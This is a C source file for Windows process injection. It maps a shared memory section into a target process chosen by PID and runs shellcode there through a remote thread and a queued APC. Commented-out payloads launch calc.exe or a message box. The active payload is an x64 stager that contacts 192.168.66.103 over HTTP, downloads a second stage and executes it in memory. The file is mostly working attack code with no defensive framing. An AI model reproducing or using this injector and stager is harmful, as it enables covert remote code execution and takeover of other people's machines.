#include <Windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "definitions.h"

// unsigned char payload[] = 
// "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
// "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
// "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
// "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
// "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
// "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
// "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
// "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
// "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
// "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
// "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
// "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
// "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
// "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
// "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
// "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
// "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
// "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
// "\x63\x2e\x65\x78\x65\x00";

unsigned char payload[] = 
// "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
// "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
// "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
// "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
// "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
// "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
// "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
// "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
// "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
// "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
// "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
// "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
// "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
// "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
// "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
// "\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
// "\x85\x2d\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
// "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
// "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
// "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x4d\x61\x70\x70\x69"
// "\x6e\x67\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x21\x00\x4d"
// "\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00";
"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x61\x6e\x4b\x43\x00\x1f\xc3\x82\x54\x4a\xb7\xa5\x13\x14\x23\x97\x5e\x0b\x93\x51\x93\xa7\x3a\x6a\x6d\x7c\x42\x95\xc7\xf8\x7a\x8c\x71\xae\x07\xb1\x99\x17\x98\xcd\x9f\x28\x00\x51\x81\xb5\xd6\x6f\x77\x11\x3a\x77\x3d\x0c\xc9\x45\x81\xc2\x10\xda\x6d\x4c\x3f\xae\x27\x52\x3c\xb9\xad\x0c\x65\x35\xe1\x73\xee\x13\xde\x84\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x29\x0d\x0a\x00\xf0\x51\x40\x47\x41\x2d\x66\xbd\xf3\xc0\x1f\xb8\xf7\xa8\xfd\xc5\x52\x6f\xb3\x3f\x75\x0f\x6d\x92\x1b\x25\x23\xf3\xb2\xd7\xa1\x7f\x93\x2b\x8e\x94\x10\xc3\x9e\x8a\xf9\x8d\xa2\x5f\xbf\xfd\xd0\xbf\xf1\xab\xbc\xe6\x48\x0f\xe9\x08\x82\x0a\x8b\xd0\xf4\x4d\x09\x19\x58\xe9\x42\x14\xbd\x98\xcf\x9a\xa4\x98\xbb\xa6\x27\x86\x8c\xd1\x65\x8c\x9f\xb3\xa1\xe3\x78\x83\xdd\xa9\x7e\x33\x04\x5f\x22\x47\x57\xa4\xfc\xa5\xac\x42\x7e\xc8\xde\xf2\x1f\x07\xb0\x0f\x2e\x08\x65\x1d\x78\x5f\xab\x16\x77\xb7\x88\x2a\xef\xdf\x6b\x4d\x9e\xcc\x43\xa8\x97\x7b\xa4\x74\xa6\xec\xea\x44\x7c\x24\xd6\x84\x44\x28\x1c\x32\xa6\x4f\xb3\xc9\xb0\x70\x3a\x97\x91\x90\x1e\x2d\xe1\x6d\x04\x59\x1a\x6c\x5e\x30\x7b\x40\xbd\x36\x70\x28\xa3\x66\x48\xd3\x68\xd1\x11\x01\x2c\x75\x49\x29\x57\x14\x29\xd3\xcb\x7f\x88\x22\xbe\xe3\xd7\x44\x11\xc2\x0a\x6d\x65\x27\x3b\x02\x4f\xc6\xde\xa6\xbb\x1b\xaa\x9b\xc3\x02\xa9\xed\xf1\x4b\xa8\xef\xd8\x00\x06\x76\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x36\x36\x2e\x31\x30\x33\x00\x19\x74\x36\x65";


int main(int argc, char *argv[])
{

    /*   Check for PID argument   */
    if( argc < 2 ) {
        printf( "[*] Missing PID of remote process\n" );
        exit( 1 );
    }

    /*   Get the PID of the process to inject into   */
    DWORD64 dwPid = (DWORD64)atoi( argv[1] );

    HANDLE hTargetProcess                = INVALID_HANDLE_VALUE;
    CLIENT_ID_R cidClientId              = { 0 };
    cidClientId.UniqueProcess            = (PDWORD64)dwPid;
    OBJECT_ATTRIBUTES oaObjectAttributes;
    memset(&oaObjectAttributes, 0, sizeof(OBJECT_ATTRIBUTES));

    /*   Open a handle to the remote process   */
    NTSTATUS ntCallResult = NtOpenProcess( &hTargetProcess, PROCESS_ALL_ACCESS, &oaObjectAttributes, &cidClientId );
    if( ntCallResult != 0 ) {
        printf( "[!] Failed to get handle to process" );
        exit(1);
    }
    printf( "hTargetProcess:    0x%p\n", hTargetProcess );

    /*   Check if process is WOW64 (32-bit)   */
    ULONG isWow64 = 0;
    UINT RetLen   = 0;
    NtQueryInformationProcess(hTargetProcess, ProcessWow64Information, &isWow64, sizeof(isWow64), &RetLen);
    printf( "isWow64:     %d\n", isWow64 );

    /*   Create a section in the local process   */
    HANDLE hSection = INVALID_HANDLE_VALUE;
    LARGE_INTEGER lnSectionSize;
    lnSectionSize.HighPart = 0;
	lnSectionSize.LowPart = 0x1000;
    // ntCallResult = NtCreateSection( &hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
    ntCallResult = NtCreateSection( &hSection, SECTION_ALL_ACCESS,
                                  NULL, &lnSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL );

    printf( "hSection:    0x%p\n", hSection );

    /*   Map a view of the section in the local process   */
    PVOID lpLocalSection = NULL;
    SIZE_T nViewSize = 0;
    DWORD dwInheritDisposition = 1;
    ntCallResult = NtMapViewOfSection( hSection, (HANDLE)(-1), &lpLocalSection, (ULONG_PTR)NULL, 0, NULL,
                                     &nViewSize, dwInheritDisposition, 0, PAGE_EXECUTE_READWRITE );
    printf( "lpLocalSection:  0x%p\n", lpLocalSection );

    /*   Copy payload to local view, which will be reflected in remote process's mapped view   */
    memcpy( lpLocalSection, payload, sizeof( payload ) );

    /*   Map a view of the section in the remote process   */
    PVOID lpRemoteSection = NULL;
    NtMapViewOfSection( hSection, hTargetProcess, &lpRemoteSection, (ULONG_PTR)NULL, 0, NULL, &nViewSize, 
                        dwInheritDisposition, 0, PAGE_EXECUTE_READWRITE );
    printf( "lpRemoteSection: 0x%p\n", lpRemoteSection );

    getchar();

    // NtUnmapViewOfSection((HANDLE)-1, hSection);

    HANDLE hModule = INVALID_HANDLE_VALUE;
    UNICODE_STRING uModuleName;
    ANSI_STRING aFuncName;
    PVOID pExport = NULL;

    /*   Create Unicode string for function call   */
    RtlInitUnicodeString(&uModuleName, L"ntdll.dll");

    /*   Get handle to ntdll.dll   */
    ntCallResult = LdrGetDllHandle(NULL, NULL, &uModuleName, &hModule);
    printf( "hModule:     0x%p\n", hModule );
    
    /*   Create an ANSI string for function call   */
    RtlInitAnsiString(&aFuncName, "RtlExitUserThread");

    /*   Get the address of RtlExitUserThread   */
    ntCallResult = LdrGetProcedureAddress(hModule,  &aFuncName, 0, &pExport);
    printf( "pExport:     0x%p\n", pExport );

    /*   Calculate offset between the address of RtlExitUserThread and the base of ntdll.dll   */
    INT64 nFuncOffset = ((INT64)pExport - (INT64)hModule);
    printf( "nFuncOffset: 0x%llx\n", nFuncOffset ); // 4c2f0
    // nFuncOffset = 0x4c2f0;
    // printf( "tweaked nFuncOffset: 0x%llx\n", nFuncOffset );

    /*   Get the base address of the local copy of ntdll.dll   */
    PVOID pNtDllBase = (PVOID)FindDLLAddress(L"ntdll.dll");
    printf( "pNtDllBase:  0x%p\n", pNtDllBase );

    /*   Calculate the address of RtlExitUserThread in the remote process   */
    PVOID pRemoteStartAddress = (PVOID)((UINT64)pNtDllBase + (UINT64)nFuncOffset);
    printf( "pRemoteStartAddress: 0x%p\n", pRemoteStartAddress );

    /*   Create a remote thread at the remote address of RtlExitUserThread   */
    HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
    ntCallResult = NtCreateThreadEx(&hRemoteThread, 0x1FFFFF, NULL, hTargetProcess, 
                                  (LPTHREAD_START_ROUTINE)pRemoteStartAddress, NULL, true, 0, 0xffff, 0xffff, NULL);
    printf( "hRemoteThread: 0x%p\n", hRemoteThread );

    getchar();

    /*   Queue an APC on the remote thread pointing to the mapped remote section   */
    ntCallResult = NtQueueApcThread(hRemoteThread, (PIO_APC_ROUTINE)&lpRemoteSection, NULL, NULL, (ULONG_PTR)NULL);
    printf( "ntCallResult: %x\n", ntCallResult );

    getchar();

    /*   Alert the thread to begin execution   */
    UINT SuspendCount = 0;
    ntCallResult = NtAlertResumeThread(hRemoteThread, &SuspendCount );
    printf( "ntCallResult: %x\n", ntCallResult );
    printf( "SuspendCount: %x\n", SuspendCount );

    return 0;
}
